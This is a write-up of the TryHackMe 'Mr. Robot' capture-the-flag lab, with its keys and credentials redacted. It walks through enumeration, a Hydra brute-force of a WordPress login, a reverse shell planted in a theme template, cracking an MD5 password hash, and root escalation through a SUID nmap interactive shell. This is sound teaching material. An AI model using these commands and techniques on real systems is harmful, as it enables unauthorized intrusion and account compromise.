# TryHackMe — Mr. Robot

**Date:** 24 September 2026  
**Platform:** TryHackMe  
**Lab Type:** Web Application / Linux Privilege Escalation  
**Objective:** Obtain all three keys and ultimately gain root access.

> **Note:** This README documents an authorized TryHackMe lab. Sensitive values are intentionally replaced with placeholders so the document can be shared publicly.

---

## 1. Overview

This document records my complete walkthrough of the TryHackMe **Mr. Robot** room.

The objective was to:

- Enumerate the target.
- Discover the web application and exposed resources.
- Obtain the first key.
- Identify a valid WordPress username and password.
- Gain WordPress Administrator access.
- Use the administrative access to obtain an operating-system shell.
- Move from the `daemon` user to the `robot` user.
- Obtain the second key.
- Identify a SUID privilege-escalation path.
- Escalate from `robot` to `root`.
- Obtain the final key.

All testing described here was performed against the authorized TryHackMe lab target.

---

## 2. Lab Information

| Item | Value |
|---|---|
| Date | 24 September 2026 |
| Platform | TryHackMe |
| Target IP | `[TARGET_IP]` |
| Kali VPN IP | `[VPN_IP]` |
| Operating System observed | Ubuntu 20.04 |

---

## 3. Attack Chain

```text
TryHackMe VPN
      ↓
Nmap reconnaissance
      ↓
HTTP/HTTPS discovery
      ↓
robots.txt
      ↓
Key 1 + fsocity.dic
      ↓
WordPress discovery
      ↓
Username enumeration
      ↓
Hydra
      ↓
WordPress Administrator
      ↓
Theme Editor
      ↓
Reverse shell
      ↓
daemon
      ↓
password.raw-md5
      ↓
Offline MD5 cracking
      ↓
robot
      ↓
Key 2
      ↓
SUID enumeration
      ↓
SUID Nmap 3.81
      ↓
Interactive shell
      ↓
root
      ↓
Key 3
```

---

# 4. VPN Connection and Reconnaissance

Before interacting with the target, I connected Kali Linux to the TryHackMe VPN.

I verified the VPN interface with:

```bash
ip addr show tun0
```

The VPN interface provided my lab IP address. For public documentation, it is represented as:

```text
[VPN_IP]
```

The VPN was necessary because the TryHackMe target is accessible through the lab network.

---

# 5. Nmap Scan

I started reconnaissance by scanning the target:

```bash
nmap [TARGET_IP]
```

The scan identified these important services:

```text
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
```

### Why this mattered

The HTTP and HTTPS services indicated that a web application was exposed. Web enumeration therefore became the next logical step.

---

# 6. Web Enumeration and robots.txt

I requested the site's `robots.txt`:

```bash
curl http://[TARGET_IP]/robots.txt
```

It revealed:

```text
fsocity.dic
key-1-of-3.txt
```

This was an important information-disclosure finding.

## Getting Key 1

I retrieved the first key:

```bash
curl http://[TARGET_IP]/key-1-of-3.txt
```

The key is redacted here:

```text
Key 1: [KEY_1]
```

### What I learned

`robots.txt` is **not an access-control mechanism**. It can tell search engines which resources should not be indexed, but those resources can still be directly requested if the server allows access.

---

# 7. Downloading and Preparing fsocity.dic

The second useful resource was `fsocity.dic`.

I downloaded it with:

```bash
wget http://[TARGET_IP]/fsocity.dic
```

I checked the file:

```bash
ls -lh fsocity.dic
wc -l fsocity.dic
```

The original file contained approximately **858,160 lines**.

I removed duplicate entries:

```bash
sort -u fsocity.dic > fsocity_unique.txt
```

Then checked the reduced list:

```bash
wc -l fsocity_unique.txt
```

The unique wordlist contained approximately **11,451 entries**.

### Why I did this

A large wordlist can contain many duplicate entries. Removing duplicates reduces unnecessary password attempts while keeping the unique candidates.

---

# 8. Discovering WordPress

I used Gobuster to enumerate directories and files:

```bash
gobuster dir -u http://[TARGET_IP] -w /usr/share/wordlists/dirb/common.txt
```

Important findings included:

```text
/admin/
/wp-admin/
/wp-content/
/wp-includes/
/wp-login
/wp-login.php
/xmlrpc.php
```

The presence of WordPress-specific paths suggested that the site was running WordPress.

I confirmed this by requesting the login page:

```bash
curl -i http://[TARGET_IP]/wp-login.php
```

The response revealed WordPress indicators, including:

```text
WordPress 4.3.1
PHP/5.5.29
```

---

# 9. Username Enumeration

I tested candidate usernames against the WordPress login form.

The responses were different for valid and invalid usernames.

For the candidate:

```text
[WORDPRESS_USERNAME]
```

the response indicated that the password was incorrect.

For an invalid username such as `admin`, the response indicated:

```text
Invalid username.
```

This allowed me to identify a valid WordPress username.

```text
Valid username: [WORDPRESS_USERNAME]
```

### Why this worked

The application returned different authentication messages depending on whether the username existed. This is an example of **username enumeration through authentication response behavior**.

---

# 10. Password Discovery with Hydra

With a valid username and the `fsocity_unique.txt` wordlist, I tested the WordPress login form using Hydra:

```bash
hydra -l [WORDPRESS_USERNAME] -P fsocity_unique.txt [TARGET_IP] http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=The password you entered for the username"
```

Hydra identified valid credentials:

```text
Username: [WORDPRESS_USERNAME]
Password: [WORDPRESS_PASSWORD]
```

I then used those credentials to log into the WordPress administration panel.

---

# 11. WordPress Administrator Access

Inside WordPress, I checked:

```text
Users → All Users
```

The compromised account had the:

```text
Administrator
```

role.

### Why this mattered

Administrator access provides extensive control over WordPress. In this lab, it also provided access to the **Theme Editor**, which allowed PHP theme files to be modified.

---

# 12. Theme Editor and Reverse Shell

I navigated to:

```text
Appearance → Editor
```

The active theme was **Twenty Fifteen**.

I initially edited `functions.php` by mistake, then restored the original file before continuing.

The intended file was:

```text
404 Template (404.php)
```

Because the PHP template was editable and executed by WordPress, I used it in the authorized lab to establish a reverse shell.

I started a listener on Kali:

```bash
nc -lvnp 4444
```

The reverse-shell callback used my TryHackMe VPN address:

```text
[VPN_IP]
```

After triggering a nonexistent URL on the target, the target connected back to Kali.

The resulting shell was running as:

```text
daemon
```

I verified this with:

```bash
whoami
```

---

# 13. Initial Shell — daemon

The initial operating-system foothold was:

```text
daemon
```

I was initially located inside the WordPress installation.

At this stage, the objective changed from web enumeration to **Linux post-exploitation and privilege escalation**.

A key lesson here was that obtaining a shell does not mean the machine is fully compromised. The next step is to understand the privileges and accessible files of the current user.

---

# 14. Finding Key 2

I searched the entire filesystem:

```bash
find / -name "key-2-of-3.txt" 2>/dev/null
```

The file was located at:

```text
/home/robot/key-2-of-3.txt
```

I attempted to read it:

```bash
cat /home/robot/key-2-of-3.txt
```

but received:

```text
Permission denied
```

### Why?

The file belonged to the `robot` user and had restrictive permissions.

This meant I needed to move from:

```text
daemon → robot
```

before I could obtain Key 2.

---

# 15. Finding the Robot Password Hash

I inspected the robot user's home directory:

```bash
ls -la /home/robot
```

The directory contained:

```text
key-2-of-3.txt
password.raw-md5
```

The second file was readable.

I retrieved it with:

```bash
cat /home/robot/password.raw-md5
```

It contained:

```text
robot:[ROBOT_MD5_HASH]
```

The value was an MD5 password hash.

---

# 16. Offline MD5 Cracking

I copied the hash to Kali and used John the Ripper to recover the password offline.

The recovered password is redacted in this public documentation:

```text
Robot password: [ROBOT_PASSWORD]
```

### Why offline cracking?

The hash could be attacked without repeatedly sending authentication attempts to the target. This is generally more efficient for a captured password hash.

---

# 17. Switching to the Robot User

From the reverse shell, I ran:

```bash
su robot
```

I supplied:

```text
[ROBOT_PASSWORD]
```

Then verified the account:

```bash
whoami
```

The result was:

```text
robot
```

I had successfully moved from:

```text
daemon → robot
```

---

# 18. Obtaining Key 2

Now that I was the `robot` user, I could read the protected file:

```bash
cat /home/robot/key-2-of-3.txt
```

The value is redacted here:

```text
Key 2: [KEY_2]
```

---

# 19. SUID Enumeration

The next objective was privilege escalation from `robot` to `root`.

I searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results was:

```text
/usr/local/bin/nmap
```

I checked its permissions:

```bash
ls -l $(which nmap)
```

The result showed:

```text
-rwsr-xr-x 1 root root ... /usr/local/bin/nmap
```

### Understanding the permissions

The important part is:

```text
rws
```

The `s` indicates that the **SUID bit is enabled**.

The binary was also owned by:

```text
root root
```

Therefore, it could execute with root's effective privileges.

---

# 20. Identifying the Nmap Version

I checked the version:

```bash
nmap --version
```

The system reported:

```text
Nmap 3.81
```

It also opened:

```text
Welcome to Interactive Mode
nmap>
```

This old interactive mode was the important feature in this lab's privilege-escalation path.

---

# 21. Privilege Escalation to Root

At the Nmap interactive prompt:

```text
nmap>
```

I used:

```text
!sh
```

Then verified my identity:

```bash
whoami
```

The result was:

```text
root
```

### Why it worked

The Nmap binary was:

- SUID-enabled
- Owned by root
- An old version with interactive functionality capable of launching a shell

Because the process had root's effective privileges, the resulting shell was also root.

---

# 22. Obtaining Key 3

Once I had root access, I could read the final key:

```bash
cat /root/key-3-of-3.txt
```

The value is redacted here:

```text
Key 3: [KEY_3]
```

This completed the room's three-key objective.

---

# 23. Keys Obtained

| Key | Value | How it was obtained |
|---|---|---|
| Key 1 | `[KEY_1]` | `robots.txt` → `key-1-of-3.txt` |
| Key 2 | `[KEY_2]` | Become `robot` → `/home/robot/key-2-of-3.txt` |
| Key 3 | `[KEY_3]` | Become `root` → `/root/key-3-of-3.txt` |

---

# 24. Complete Attack Chain

```text
TryHackMe VPN
        ↓
Nmap reconnaissance
        ↓
HTTP / HTTPS discovered
        ↓
robots.txt
        ↓
Key 1 + fsocity.dic
        ↓
Wordlist preparation
        ↓
WordPress discovery
        ↓
Username enumeration
        ↓
Hydra
        ↓
WordPress credentials
        ↓
Administrator access
        ↓
Theme Editor
        ↓
PHP reverse shell
        ↓
daemon
        ↓
Find robot's files
        ↓
password.raw-md5
        ↓
Offline MD5 cracking
        ↓
robot
        ↓
Key 2
        ↓
SUID enumeration
        ↓
SUID Nmap 3.81
        ↓
Nmap interactive shell
        ↓
root
        ↓
Key 3
```

---

# 25. Key Lessons Learned

- **Reconnaissance comes first.** I started by identifying exposed services before attempting exploitation.
- **robots.txt is not security.** It can expose filenames and resources that are still directly accessible.
- **Directory enumeration matters.** Gobuster helped identify WordPress-specific endpoints.
- **Authentication responses can leak information.** Different login errors helped identify a valid username.
- **Administrator privileges can become OS-level access.** In this lab, WordPress administration allowed modification of an executable PHP template.
- **A low-privileged shell is only initial access.** After obtaining `daemon`, I had to enumerate the Linux environment again.
- **Readable credential files can lead to another account.** The MD5 hash in `password.raw-md5` provided a route to `robot`.
- **SUID enumeration is important for Linux privilege escalation.**
- **The SUID bit itself is not automatically a vulnerability.** The interesting combination here was a root-owned SUID Nmap binary with old interactive functionality.
- **The overall methodology is iterative:** enumerate → identify weakness → gain access → enumerate again → escalate → verify.

---

# 26. Final Takeaway

The Mr. Robot room demonstrated how several weaknesses can be chained together to achieve complete system compromise.

The important part was not any single command. The real lesson was understanding **why one discovery led to the next step**:

```text
Information disclosure
        ↓
Credential discovery
        ↓
Web application access
        ↓
Initial shell
        ↓
Local credential discovery
        ↓
User escalation
        ↓
SUID enumeration
        ↓
Root access
```

This room gave me practical experience with web reconnaissance, WordPress enumeration, credential attacks in an authorized lab, reverse shells, Linux enumeration, password-hash cracking, SUID privilege escalation, and documenting an end-to-end attack chain.
